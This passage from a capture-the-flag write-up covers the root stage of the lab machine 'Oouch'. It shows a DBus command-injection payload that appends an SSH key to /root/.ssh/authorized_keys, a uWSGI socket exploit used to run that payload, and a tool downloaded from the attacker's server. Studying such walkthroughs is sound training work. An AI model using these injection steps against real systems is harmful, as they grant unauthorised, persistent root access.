lrwxrwxrwx 1 root root    9 Feb 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 qtc  qtc   220 Feb 11  2020 .bash_logout
-rw-r--r-- 1 qtc  qtc  3526 Feb 11  2020 .bashrc
drwx------ 3 qtc  qtc  4096 Feb 25  2020 .gnupg
-rw-r--r-- 1 root root   55 Feb 11  2020 .note.txt
-rw-r--r-- 1 qtc  qtc   807 Feb 11  2020 .profile
drwx------ 2 qtc  qtc  4096 Feb 11  2020 .ssh
-rw------- 1 qtc  qtc    33 Feb  2 06:01 user.txt
qtc@oouch:~$ cat user.txt 
a9a86**********************7c8b7
```

## Root

### Enumeration

Looks like there's a private key in `~/.ssh` that's different from the one we used to connect. There's also a `.note.txt` file in the qtc home directory with the following contents:

`Implementing an IPS using DBus and iptables == Genius?`

Running `pspy` we see some interesting commands being run when we send a `<script>` tag to the admin via the contact form 

```
2021/02/03 01:06:01 CMD: UID=0    PID=10408  | /usr/bin/python3 /root/get_pwnd.py 
2021/02/03 01:06:01 CMD: UID=0    PID=10409  | /bin/sh -c /usr/sbin/iptables -F PREROUTING -t mangle 
2021/02/03 01:06:14 CMD: UID=0    PID=10413  | sh -c iptables -A PREROUTING -s 10.10.14.12 -t mangle -j DROP 
2021/02/03 01:06:14 CMD: UID=0    PID=10411  | /root/dbus-server
```

So it would seem that this is the 'IPS' being triggered.  There aren't any obvious signs of the web server source code around, but we
do find some interfaces for docker.

```shell
qtc@oouch:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:a7:e9 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.177/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:a7e9/64 scope global dynamic mngtmpaddr 
       valid_lft 85976sec preferred_lft 13976sec
    inet6 fe80::250:56ff:feb9:a7e9/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:e2:ef:7a:c5 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-d21b634fab23: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:66:aa:9d:3d brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-d21b634fab23
       valid_lft forever preferred_lft forever
    inet6 fe80::42:66ff:feaa:9d3d/64 scope link 
       valid_lft forever preferred_lft forever
[...]
```

Let's see what's open on them.  We'll grab `nmap` from our tools server and then use it against the docker subnets

```
qtc@oouch:~$ curl http://10.10.14.12:8081/tools/nmap64s -o nmap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0  2345k      0  0:00:02  0:00:02 --:--:-- 2344k
qtc@oouch:~$ chmod +x nmap
qtc@oouch:~$ ./nmap -F 172.17-18.0.1-254

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-02-03 01:26 CET
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00039s latency).
Not shown: 301 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap scan report for 172.18.0.1
Host is up (0.00046s latency).
Not shown: 301 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap scan report for 172.18.0.2
Host is up (0.00044s latency).
Not shown: 302 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for 172.18.0.3
Host is up (0.00039s latency).
Not shown: 302 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for 172.18.0.4
Host is up (0.00037s latency).
All 303 scanned ports on 172.18.0.4 are closed

Nmap scan report for 172.18.0.5
Host is up (0.00041s latency).
Not shown: 302 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
```

After attempting to connect to the various ssh servers we find that the private key we found allows us to connect to 172.18.0.5

### Consumer Docker Container (172.18.0.5)

After looking around we find a `/code` directory in the root. This looks to be the code for consumer server.  It would seem that uWSGI is
being used to serve the python server.  There's a `uwsgi.ini` file in the directory:

```shell
qtc@dd8a235756c6:/code$ cat uwsgi.ini 
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

 In `/code/oouch/routes.py` we find the `/contact` route handler:

```python
@app.route('/contact', methods=['GET', 'POST'])
@login_required
def contact():
    '''
    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.
    The messages are scanned for valid url's and these urls are saved to a file on disk. A cronjob will view the files regulary and
    invoke requests on the corresponding urls.

    Parameters:
        None

    Returns:
        render                (Render)                  Renders the contact page.
    '''
    # First we need to load the contact form
    form = ContactForm()

    # If the form was already submitted, we process the contents
    if form.validate_on_submit():

        # First apply our primitive xss filter
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')

        # The regex defined at the beginning of this file checks for valid urls
        url = regex.search(form.textfield.data)
        if url:

            # If an url was found, we try to save it to the file /code/urls.txt
            try:
                with open("/code/urls.txt", "a") as url_file:
                    print(url.group(0), file=url_file)
            except:
                print("Error while openeing 'urls.txt'")

        # In any case, we inform the user that has message has been sent
        return render_template('contact.html', title='Contact', send=True, form=form)

    # Except the functions goes up to here. In this case, no form was submitted and we do not need to inform the user
    return render_template('contact.html', title='Contact', send=False, form=form)
```

It looks to make a remote procedure call via dbus to block a certain IP. The `/root/dbus-server` we saw earlier looks to be picking up the request
and making a command line call to iptables. Maybe if we can change the value in the block call, we can get command injection.  We would need a way
to alter the IP address though.  We can try doing a remote procedure call from the qtc account using our own python script:

```python
import sys
sys.path.insert(0, "/usr/lib/python3/dist-packages")
import dbus

bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
block_iface.Block("10.10.10.10; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWk1w20sjujx1eEoYGnaBfAaQ2ubbXj5s1BHG4DyImRygZTk7nNkHNn8one89foL0Igv1sQnCN4G7uqPVcYNgB6yzCEOIn9sSqCJN+VarQexc8VzoagiOq8PTMQSRlfmdh4p7sl7IkMw6KWfl1DAm/XTgeW239KQu3v9gSV0nrmn23Fdm0BbBFgMhIKq6/LUlqP10JbsfLVkJD+9NlE9y/sv7EomhqWDkZvGUpAg8mDRC8Z25zk8EOyce5y5fDaKKeWjqqnERDeatWN4WXw50uSoyECavY7VezVLHD62vNVwqCOtAUtk4r2rciKe7Pr6YHWOhb3bROtvmLX5ZbBxCUXeRXQfENVhT8xMZpxJeCdyvl4jTLRTC2BEoUY75ae2P+AmKFZiLFJYZUO2selPRlZsTh3rpPxrsADn7fN04BmdZndvAapNSUJacq2MDXZ0VkG/Ij4og8NN5SykVr7Swj9OKUbY3B0XtWVWxDietHqj7epagHMtIAQWsUBA05w88= zoey@nomadic' >> /root/.ssh/authorized_keys; echo")
bus.close()
```

However, we've gotta be the `www-data` user, or we'll be denied:

```shell
qtc@dd8a235756c6:~$ python send-dbus.py 
ERROR:dbus.proxies:Introspect error on :1.2:/htb/oouch/Block: dbus.exceptions.DBusException: org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; type="method_call", sender=":1.2554" (uid=1000 pid=10946 comm="python send-dbus.py ") interface="org.freedesktop.DBus.Introspectable" member="Introspect" error name="(unset)" requested_reply="0" destination=":1.2" (uid=0 pid=1292 comm="/root/dbus-server ")
Traceback (most recent call last):
  File "send-dbus.py", line 8, in <module>
    block_iface.Block("10.10.10.10; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWk1w20sjujx1eEoYGnaBfAaQ2ubbXj5s1BHG4DyImRygZTk7nNkHNn8one89foL0Igv1sQnCN4G7uqPVcYNgB6yzCEOIn9sSqCJN+VarQexc8VzoagiOq8PTMQSRlfmdh4p7sl7IkMw6KWfl1DAm/XTgeW239KQu3v9gSV0nrmn23Fdm0BbBFgMhIKq6/LUlqP10JbsfLVkJD+9NlE9y/sv7EomhqWDkZvGUpAg8mDRC8Z25zk8EOyce5y5fDaKKeWjqqnERDeatWN4WXw50uSoyECavY7VezVLHD62vNVwqCOtAUtk4r2rciKe7Pr6YHWOhb3bROtvmLX5ZbBxCUXeRXQfENVhT8xMZpxJeCdyvl4jTLRTC2BEoUY75ae2P+AmKFZiLFJYZUO2selPRlZsTh3rpPxrsADn7fN04BmdZndvAapNSUJacq2MDXZ0VkG/Ij4og8NN5SykVr7Swj9OKUbY3B0XtWVWxDietHqj7epagHMtIAQWsUBA05w88= zoey@nomadic' >> /root/.ssh/authorized_keys; echo")
  File "/usr/lib/python3/dist-packages/dbus/proxies.py", line 70, in __call__
    return self._proxy_method(*args, **keywords)
  File "/usr/lib/python3/dist-packages/dbus/proxies.py", line 145, in __call__
    **keywords)
  File "/usr/lib/python3/dist-packages/dbus/connection.py", line 651, in call_blocking
    message, timeout)
dbus.exceptions.DBusException: org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; type="method_call", sender=":1.2554" (uid=1000 pid=10946 comm="python send-dbus.py ") interface="htb.oouch.Block" member="Block" error name="(unset)" requested_reply="0" destination=":1.2" (uid=0 pid=1292 comm="/root/dbus-server ")
```

The `/tmp/uwsgi.socket` looks to be world-writeable, perhaps we can send a request to it? Doing some more enum we find
an [exploit for uwsgi](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py).

### Owning Root

Lets transfer the exploit to the docker container, and then use it to run our python file.

`python uwsgi-exploit.py -m unix -u /tmp/uwsgi.socket -c 'python /home/qtc/send-dbus.py'`

On our first attempt we hit an error on line 18, but removing it seems to fix the problem. We should be able to watch the calls go through in `pspy`:

```shell
2021/02/03 02:12:32 CMD: UID=1000 PID=11038  | python uwsgi-exp.py -m unix -u /tmp/uwsgi.socket -c python /home/qtc/send-dbus.py 
2021/02/03 02:12:32 CMD: UID=33   PID=11039  | uwsgi --ini uwsgi.ini --chmod-sock=666 
2021/02/03 02:12:32 CMD: UID=0    PID=11043  | sh -c iptables -A PREROUTING -s 10.10.10.10; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWk1w20sjujx1eEoYGnaBfAaQ2ubbXj5s1BHG4DyImRygZTk7nNkHNn8one89foL0Igv1sQnCN4G7uqPVcYNgB6yzCEOIn9sSqCJN+VarQexc8VzoagiOq8PTMQSRlfmdh4p7sl7IkMw6KWfl1DAm/XTgeW239KQu3v9gSV0nrmn23Fdm0BbBFgMhIKq6/LUlqP10JbsfLVkJD+9NlE9y/sv7EomhqWDkZvGUpAg8mDRC8Z25zk8EOyce5y5fDaKKeWjqqnERDeatWN4WXw50uSoyECavY7VezVLHD62vNVwqCOtAUtk4r2rciKe7Pr6YHWOhb3bROtvmLX5ZbBxCUXeRXQfENVhT8xMZpxJeCdyvl4jTLRTC2BEoUY75ae2P+AmKFZiLFJYZUO2selPRlZsTh3rpPxrsADn7fN04BmdZndvAapNSUJacq2MDXZ0VkG/Ij4og8NN5SykVr7Swj9OKUbY3B0XtWVWxDietHqj7epagHMtIAQWsUBA05w88= zoey@nomadic' >> /root/.ssh/authorized_keys; echo -t mangle -j DROP 
2021/02/03 02:12:32 CMD: UID=0    PID=11042  | sh -c iptables -A PREROUTING -s 10.10.10.10; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWk1w20sjujx1eEoYGnaBfAaQ2ubbXj5s1BHG4DyImRygZTk7nNkHNn8one89foL0Igv1sQnCN4G7uqPVcYNgB6yzCEOIn9sSqCJN+VarQexc8VzoagiOq8PTMQSRlfmdh4p7sl7IkMw6KWfl1DAm/XTgeW239KQu3v9gSV0nrmn23Fdm0BbBFgMhIKq6/LUlqP10JbsfLVkJD+9NlE9y/sv7EomhqWDkZvGUpAg8mDRC8Z25zk8EOyce5y5fDaKKeWjqqnERDeatWN4WXw50uSoyECavY7VezVLHD62vNVwqCOtAUtk4r2rciKe7Pr6YHWOhb3bROtvmLX5ZbBxCUXeRXQfENVhT8xMZpxJeCdyvl4jTLRTC2BEoUY75ae2P+AmKFZiLFJYZUO2selPRlZsTh3rpPxrsADn7fN04BmdZndvAapNSUJacq2MDXZ0VkG/Ij4og8NN5SykVr7Swj9OKUbY3B0XtWVWxDietHqj7epagHMtIAQWsUBA05w88= zoey@nomadic' >> /root/.ssh/authorized_keys; echo -t mangle -j DROP 
2021/02/03 02:12:32 CMD: UID=0    PID=11041  | /root/dbus-server 
2021/02/03 02:12:32 CMD: UID=33   PID=11040  | python /home/qtc/send-dbus.py 
2021/02/03 02:13:01 CMD: UID=0    PID=11046  | /usr/sbin/CRON -f 
2021/02/03 02:13:01 CMD: UID=0    PID=11049  | /usr/bin/python3 /root/get_pwnd.py 
2021/02/03 02:13:01 CMD: UID=0    PID=11050  | /bin/sh -c /usr/sbin/iptables -F PREROUTING -t mangle
```

If everything went to plan we should now be able to use our key to ssh into the box as root.

```shell
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master› 
╰─$ ssh root@oouch.htb 
The authenticity of host 'oouch.htb (10.10.10.177)' can't be established.
ED25519 key fingerprint is SHA256:6/ZyfRrDDz0w1+EniBrf/0LXg5sF4o5jYNEjjU32y8s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'oouch.htb' (ED25519) to the list of known hosts.
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Dec 15 12:15:18 2020
root@oouch:~# cat root.txt
d8684**********************89e42
```
